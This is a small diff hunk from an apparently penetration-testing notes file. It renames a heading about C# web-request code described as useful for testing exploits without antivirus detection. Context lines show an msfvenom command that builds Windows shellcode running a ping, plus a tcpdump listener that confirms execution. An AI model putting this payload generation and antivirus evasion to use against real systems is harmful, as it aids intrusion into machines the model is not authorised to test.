@@ -24,7 +24,7 @@ msfvenom -f c -p windows/exec CMD="cmd.exe /C ping 192.168.0.135"
 tcpdump icmp -n -i wlan0
 ```
 
-.NET code for a a web request. This is good to test exploits without getting caught by AV. Needs to be compiled with visual studio or another compiler:
+C# code for a a web request. This is good to test exploits without getting caught by AV. Needs to be compiled with visual studio or another compiler:
 
 ```
 Raw C# code:
